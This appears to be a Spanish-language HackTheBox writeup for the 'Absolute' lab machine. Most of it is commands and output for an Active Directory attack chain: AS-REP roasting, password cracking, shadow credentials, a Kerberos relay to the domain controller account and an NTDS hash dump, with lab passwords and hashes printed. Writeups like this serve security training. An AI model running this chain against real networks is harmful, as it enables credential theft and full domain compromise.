@@ -1,0 +1,483 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Absolute HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/absolute.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Absolute HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Absolute de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Absolute de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Absolute HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Absolute HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Absolute de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Absolute HackTheBox</h1>
+          <p>Resolución de la máquina Absolute de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nma, lanzando scripts de reconocimiento</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sC 10.10.11.181
+Nmap scan report for 10.10.11.181
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+| ssl-cert: Subject: commonName=dc.absolute.htb
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+| ssl-cert: Subject: commonName=dc.absolute.htb
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49675/tcp open  unknown
+49699/tcp open  unknown</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver dc.absolute.htb asi que agregamos ambos hosts al /etc/hosts con la ip</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"10.10.11.181 absolute.htb dc.absolute.htb" </span><span class="p">|</span><span class="s2"> sudo tee </span><span class="p">-a /etc/hosts
+10.10.11.181 absolute.htb dc.absolute.htb</span>
+</code></pre></div></div>
+
+<div><p>En el codigo fuente podemos ver varios archivos jpg en /images asi que los descargamos</p></div>
+<div><p><img src="./1.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ </span><span class="no">for </span><span class="p">i</span><span class="p"> in</span><span class="k"> $(</span><span class="s2">seq</span><span class="p"> 1 6</span><span class="k">)</span><span class="p">;</span><span class="no"> do</span><span class="s2"> wget </span><span class="p">http://absolute.htb/images/hero_$i.jpg;</span><span class="no"> done</span><span class="p">
+</span>
+</code></pre></div></div>
+
+<div><p>Usano exiftool en una de las imagenes podemos ver un campo Author con un posible usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ exiftool </span><span class="p">hero_1.jpg 
+ExifTool Version Number         : 12.54
+File Name                       : hero_1.jpg
+Directory                       : .
+File Size                       : 407 kB
+File Modification Date/Time     : 2022:06:07 15:45:20-04:00
+File Access Date/Time           : 2023:01:25 19:40:30-05:00
+File Inode Change Date/Time     : 2023:01:25 19:39:33-05:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Little-endian (Intel, II)
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Artist                          : James Roberts
+Y Cb Cr Positioning             : Centered
+Quality                         : 60%
+XMP Toolkit                     : Image::ExifTool 11.88
+Author                          : </span><span class="kd">James Roberts</span><span class="p">
+Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
+Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
+Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
+DCT Encode Version              : 100
+APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
+APP14 Flags 1                   : (none)
+Color Transform                 : YCbCr
+Image Width                     : 1900
+Image Height                    : 1150
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 1900x1150
+Megapixels                      : 2.2</span>
+</code></pre></div></div>
+
+<div><p>Asi que de todas las imagenes podemos conseguir una posible lista de usuarios validos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ exiftool </span><span class="na">*</span><span class="p">.jpg |</span><span class="s2"> grep </span><span class="p">Author | </span><span class="s2">awk </span><span class="no">'{print $3,$4}'</span><span class="p">
+James Roberts
+Michael Chaffrey
+Donald Klay
+Sarah Osvald
+Jeffer Robinson
+Nicole Smith</span>
+</code></pre></div></div>
+
+<div><p>Generalmente en AD se usan nombre como N.Surname, asi que le daremos esa forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">J.Roberts
+M.Chaffrey
+D.Klay
+S.Osvald
+J.Robinson
+N.Smith</span>
+</code></pre></div></div>
+
+<div><p>Podemos comprobar que sean validos con kerbrute y lo confirmamos, todon son validos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ kerbrute </span><span class="p">userenum users.txt -d absolute.htb --dc dc.absolute.htb
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/  
+
+Version: v1.0.3 (9dad6e1) - 01/26/23 - Ronnie Flathers @ropnop
+
+ >  Using KDC(s):
+ >   dc.absolute.htb:88
+
+</span><span class="s2"> >  [+] VALID USERNAME:	 J.Roberts@absolute.htb
+ >  [+] VALID USERNAME:	 N.Smith@absolute.htb
+ >  [+] VALID USERNAME:	 J.Robinson@absolute.htb
+ >  [+] VALID USERNAME:	 S.Osvald@absolute.htb
+ >  [+] VALID USERNAME:	 M.Chaffrey@absolute.htb
+ >  [+] VALID USERNAME:	 D.Klay@absolute.htb</span><span class="p">
+ >  Done! Tested 6 usernames (6 valid) in 0.440 seconds</span>
+</code></pre></div></div>
+
+<div><p>Con una lista de usuarios validos podemos probar un ASREPRoast para intentar conseguir un hash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-GetNPUsers </span><span class="p">absolute.htb/ -dc-ip dc.absolute.htb -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User J.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User M.Chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$D.Klay@ABSOLUTE.HTB:5b1a800cb271d48ca649b04a0e818ced$343deda4b3ecd7aab78142680f002b7353f2e1d60d5bbb02518b2f8cc8ea7292f3547379b604b11e6488bdbe65f0226de48e14dc2a70e8c71656f3185329bcf7bb5d1d85c569662dd37b7bbe67d46abb7393923a62fa1f4db730ac9b49643da5341c2b76df4c10507f0bd836f6aa2c877afb8ac69690ba6b3f4a9ebe7408f2b7488d817ae009b54a845d5216bfc240f57f9b0ad8d18d40d08e82957e0591aa6b43e6fe584780ed9384c5e4b9a1a3c84e1dc0f8a8446e8e8dba40a42f183d672571bea7f8431bcdd58ed30706997917afbf45a80f4d8a01ad2e247d2e1318a3c816a2e49e3c46df46b4b21ded
+[-] User S.Osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User J.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User N.Smith doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div>
+
+<div><p>Ahora con ayuda de john logramos romper el hash y conseguir una contraseña en texto claro</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP)
+</span><span class="kd">Darkmoonsky248girl </span><span class="p">(</span><span class="na">$krb5asrep$23$D.Klay@ABSOLUTE.HTB</span><span class="p">)
+Session completed.</span>
+</code></pre></div></div>
+
+<div><p>Tenemos credenciales válidas, pero al intentar validarlas con crackmapexec tenemos un problema...</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb absolute.htb -u D.Klay -p Darkmoonsky248girl 
+</span><span class="na">SMB</span><span class="p">         10.10.11.181   445    DC              </span><span class="na"> [*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.181   445    DC              </span><span class="k"> [-] </span><span class="p">absolute.htb\D.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION</span>
+</code></pre></div></div>
+
+<div><p>Hay una restriccion que nos permite autenticarnos por este protocolo, pero no esta todo perdido despues de todo hay otros como kerberos, lo unico tenemos que sincronizar la hora de la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo ntpdate </span><span class="p">-s absolute.htb</span>
+</code></pre></div></div>
+
+<div><p>Generamos el ticket y lo exportamos a la variable KRB5CCNAME para autenticarnos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-getTGT </span><span class="p">absolute.htb/d.klay:Darkmoonsky248girl
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in d.klay.ccache
+
+</span><span class="s2">❯ export </span><span class="p">KRB5CCNAME=d.klay.ccache
+</span>
+</code></pre></div></div>
+
+<div><p>Ahora con crackmapexec a ldap a través de kerberos podemos dumpear usuarios (y descripciones)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">ldap absolute.htb -u d.klay -d absolute.htb -k --kdcHost dc.absolute.htb --users
+</span><span class="na">SMB</span><span class="p">         absolute.htb   445    DC               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="s2">[+]</span><span class="p"> absolute.htb\
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="s2">[*]</span><span class="p"> Total of records returned 20
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">Administrator                  Built-in account for administering the computer/domain
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">Guest                          Built-in account for guest access to the computer/domain
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">krbtgt                         Key Distribution Center Service Account
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">J.Roberts
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">M.Chaffrey
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">D.Klay
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">s.osvald
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">j.robinson
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">n.smith
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">m.lovegod
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">l.moore
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">c.colt
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">s.johnson
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">d.lemm
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">svc_smb                        AbsoluteSMBService123!
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">svc_audit
+</span><span class="na">LDAP</span><span class="p">        absolute.htb   389    DC               </span><span class="no">winrm_user                     Used to perform simple network tasks</span>
+</code></pre></div></div>
+
+<div><p>La descripción del usuario svc_smb nos muestra una contraseña, de la misma manera que antes podemos obtener un TGT de kerberos para svc_smb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-getTGT </span><span class="p">absolute.htb/svc_smb:AbsoluteSMBService123!
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in svc_smb.ccache
+
+</span><span class="s2">❯ export </span><span class="p">KRB5CCNAME=svc_smb.ccache
+</span>
+</code></pre></div></div>
+
+<div><p>Al conectarnos a smb por kerberos podemos ver un recurso Shared que nos ofrede un archivo .exe y un archivo .sh, descargamos ambos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-smbclient </span><span class="p">svc_smb@dc.absolute.htb -k -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+
+</span><span class="kd">#</span><span class="p"> shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Shared
+SYSVOL
+</span><span class="kd">#</span><span class="p"> use Shared
+</span><span class="kd">#</span><span class="p"> ls
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
+-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
+-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
+</span><span class="kd">#</span><span class="p"> get test.exe
+</span><span class="kd">#</span><span class="p"> get compiler.sh
+</span><span class="kd">#</span>
+</code></pre></div></div>
+
+<div><p>En un Windows podemos ejecutar el .exe, pero realmente no nos dice nada interesante</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">.\test.exe</span><span class="p">
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div>
+
+<div><p>Necesitamos varias cosas, primero que nada conectar la vpn de htb en el windows</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Ahora es necesario agregar los hosts para que sepa a donde resolver el dominio</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Ejecutamos el exe escuchando con wireshark por la interfaz de la vpn, vemos algunas peticiónes interesantes que parecen realizar una autenticación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">.\test.exe</span><span class="p">
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Revisando la petición podemos ver las credenciales usadas en la autenticación</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Tenemos credenciales para ldap, podemos conseguir otro ticket para kerberos y jugar con bloodhound para ver rutas para escalar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-getTGT </span><span class="p">absolute.htb/m.lovegod:AbsoluteLDAP2022!
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Saving ticket in m.lovegod.ccache
+
+</span><span class="s2">❯ export </span><span class="p">KRB5CCNAME=m.lovegod.ccache
+
+</span><span class="s2">❯ bloodhound-python </span><span class="p">-u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -no-pass -c ALL
+INFO: Found AD domain: absolute.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 18 users
+INFO: Found 55 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Ignoring host dc.absolute.htb since its reported name  does not match
+INFO: Done in 00M 14S
+INFO: Compressing output into 20230126082132_bloodhound.zip</span>
+</code></pre></div></div>
+
+<div><p>Subimos el zip a la base de datos de bloodhound y marcamos usuarios owneados</p></div>
+<a href="./6.png" target="_blank"><div><p><img src="./6.png"><p></div></a>
+
+<div><p>Podemos ver una posible ruta de pasar a winrm_user mediante el grupo network audit</p></div>
+<a href="./7.png" target="_blank"><div><p><img src="./7.png"><p></div></a>
+
+<div><p>Tenemos que crear un entorno en un Windows para simular el dc, haremos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">Import-Module </span><span class="p">.\PowerView.ps1
+PS C:\Users\pc1\Desktop> </span><span class="s2">$SecPassword </span><span class="c1">= </span><span class="no">ConvertTo-SecureString </span><span class="na">"AbsoluteLDAP2022!" </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\pc1\Desktop> </span><span class="s2">$Cred</span><span class="c1"> = </span><span class="no">New-Object</span><span class="p"> System.Management.Automation.PSCredential(</span><span class="na">"Absolute.htb\m.lovegod"</span><span class="p">,</span><span class="s2"> $SecPassword</span><span class="p">)
+PS C:\Users\pc1\Desktop> </span><span class="no">Add-DomainObjectAcl </span><span class="c1">-Credential </span><span class="s2">$Cred</span><span class="c1"> -TargetIdentity </span><span class="na">"Network Audit" </span><span class="c1">-Rights </span><span class="p">all</span><span class="c1"> -DomainController </span><span class="p">dc.absolute.htb </span><span class="c1">-PrincipalIdentity </span><span class="na">"m.lovegod"</span><span class="p">
+PS C:\Users\pc1\Desktop> </span><span class="no">Add-ADPrincipalGroupMembership </span><span class="c1">-Identity </span><span class="p">m.lovegod </span><span class="c1">-MemberOf </span><span class="na">"Network Audit" </span><span class="c1">-Credential </span><span class="s2">$Cred </span><span class="c1">-server </span><span class="p">dc.absolute.htb</span>
+</code></pre></div></div>
+
+<div><p>Usando a m.lovegod con kerberos usamos <a href="https://github.com/dirkjanm/PKINITtools">pywhisker</a> para crear un pfx y su contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">pywhisker.py -d absolute.htb -u m.lovegod -t winrm_user -k --no-pass --action add
+</span><span class="na">[*]</span><span class="p"> Searching for the target account
+</span><span class="na">[*]</span><span class="p"> Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
+</span><span class="na">[*]</span><span class="p"> Generating certificate</span><span class="p">
+</span><span class="na">[*]</span><span class="p"> Certificate generated</span><span class="p">
+</span><span class="na">[*] </span><span class="p">Generating KeyCredential</span><span class="p">
+</span><span class="na">[*] </span><span class="p">KeyCredential generated with DeviceID: b05ff8c1-5a40-91c6-b0a4-fce0242ac4cb</span><span class="p">
+</span><span class="na">[*] </span><span class="p">Updating msDS-KeyCredentialLink attribute of winrm_user</span><span class="p">
+</span><span class="s2">[+] </span><span class="p">Update the msDS-KeyCredentialLink attribute of the target object</span><span class="p">
+</span><span class="s2">[+] </span><span class="p">Saved PFX (#PKCS12) certificate & key at path: ZgbGSY8Q.pfx</span><span class="p">
+</span><span class="na">[*] </span><span class="p">Must be used with password: z9BC3FAFY3QdA9t9ANKK</span><span class="p">
+</span><span class="na">[*] </span><span class="p">A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span>
+</code></pre></div></div>
+
+<div><p>Usamos gettgtpkinit para conseguir un tgt para winrm_user y lo exportamos a la variable</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">gettgtpkinit.py absolute.htb/winrm_user -cert-pfx ZgbGSY8Q.pfx -pfx-pass z9BC3FAFY3QdA9t9ANKK winrm_user.ccache
+minikerberos INFO     Loading certificate and key from file
+minikerberos INFO     Requesting TGT
+minikerberos INFO     AS-REP encryption keys (you might need this later):
+minikerberos INFO     e564eb3c290f09df5de646ca54feb2bb8672ab04ec7135029d32697893f9e63
+minikerberos INFO     Saver TGT to file
+
+</span><span class="s2">❯ export </span><span class="p">KRB5CCNAME=winrm_user.ccache
+</span>
+</code></pre></div></div>                                                                                                
+
+<div><p>Ahora nos podemos conectar facilmente con evil-winrm y ver la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm</span><span class="p"> -i absolute.htb -r absolute.htb
+PS C:\Users\winrm_user\Documents> </span><span class="no">whoami</span><span class="p">
+absolute\winrm_user
+PS C:\Users\winrm_user\Documents> </span><span class="no">type </span><span class="p">..\Desktop\user.txt
+9d4**************************906
+PS C:\Users\winrm_user\Documents></span>
+</code></pre></div></div>
+
+<div><p>Con ayuda de RunasCS y KrbRelay usando las credenciales intentaremos ver los datos que necesitamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="no">.\RunasCS.exe </span><span class="p">mlovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred"
+[*]Relaying context: absolute.htb\DC$
+[*]Rewriting function table
+[*]Rewriting PEB
+[*]GetModuleFileName: System
+[*]Init com server
+[*]GetModuleFileName: C:\users\winrm_user\documents\KrbRelay.exe
+[*]Register com server
+objref:TUVPVwEAAA....
+
+[*] Forcing SYSTEM authentication
+[*] Using CLSID: 752073a1-23f2-4396-85f0-8fdb879ed0ed
+[*] apReq: ....
+[*] bind: 0
+[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
+[*] apRep1: ....
+[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
+[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
+[*] apRep2: ....
+[*] bind: 0
+[*] ldap_get_option: LDAP_SUCCESS
+[+] LDAP session established
+[*] ldap_modify: LDAP_SUCCESS
+
+[*] Rubeus.exe asktgt /user: DC$ /certificate:CERTIFICATE /password:"xX1#qM5/eJ0=" /getcredentials /show</span>
+</code></pre></div></div>
+
+<div><p>Ahora ejecutamos el comando que nos da jugando con Rubeus, podemos ver el hash ntlm</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">                            
+<code><span class="p">PS C:\Users\winrm_user\Documents> </span><span class="no">.\Rubeus.exe </span><span class="p">asktgt /user:DC$ /certificate:CERTIFICATE> /password:"xX1#qM5/eJ0=" /getcredentials /show
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=DC$
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+................................................................
+
+
+ ServiceName              :  krbtgt/absolute.htb
+  ServiceRealm             :  ABSOLUTE.HTB
+  UserName                 :  DC$
+  UserRealm                :  ABSOLUTE.HTB
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  yHrqDFTj1Zwc3W8/QBNKDg==
+  ASREP (key)              :  F99EF936A3999F80D62AC070288A3D00
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : </span><span class="kd">A7864AB463177ACB9AEC553F18F42577</span>
+</code></pre></div></div>
+
+<div><p>Con esto y ayuda de crackmapexec podemos dumpear el ntds y ver todos los hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb absolute.htb -u</span><span class="no"> 'DC$'</span><span class="p"> -H A7864AB463177ACB9AEC553F18F42577 --ntds
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="s2">[+]</span><span class="p"> absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577 
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="kd">[-]</span><span class="p"> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="s2">[+]</span><span class="p"> Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
